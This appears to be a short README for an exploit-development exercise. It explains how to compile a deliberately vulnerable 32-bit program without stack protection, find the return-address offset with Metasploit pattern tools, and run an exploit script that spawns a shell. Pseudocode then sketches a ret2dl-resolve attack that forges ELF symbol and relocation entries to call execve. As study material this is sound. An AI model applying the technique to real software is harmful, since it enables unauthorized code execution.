How to test
===========

1. Build vuln.c

    gcc -fno-stack-protector ../vuln.c -o /tmp/vuln -m32 -O2

2. Find the offset of the saved IP

    ruby19 "$METASPLOIT/tools/pattern_create.rb" 256 | /tmp/vuln
    dmesg | tail
    ruby19 "$METASPLOIT/tools/pattern_offset.rb" $SEGFAULT_IP

3. Launch the attack with the desired parameter

    (python ./exploit.py /tmp/vuln $OFFSET; echo ls) | /tmp/vuln

Basic idea
==========

char *buffer = .bss;
char *new_stack = buffer + 1024;
int *rubbish = new_stack + 4;

strcpy(buffer, "execve");
  *((int *) buffer) = 'exec';
  *(((int *) buffer) + 1) = 've\0\0';
char *name = buffer;
buffer += strlen(buffer) + 1;

Elf32_Sym *symbol = (Elf32_Sym *) buffer;
symbol->st_name = name - .dynstr;
symbol->st_value = 0;
symbol->st_info = 0;
symbol->st_other = 0;
symbol->st_shndx = 0;
buffer += sizeof(*symbol);

Elf32_Rel *reloc = (Elf32_Rel *) buffer;
reloc->r_offset = rubbish++;
reloc->r_info = (R_386_JUMP_SLOT | (symbol - .dynsym) / sizeof(symbol));
buffer += sizeof(reloc):

pre_plt((reloc - .rel.plt) / sizeof(Elf32_Rel));
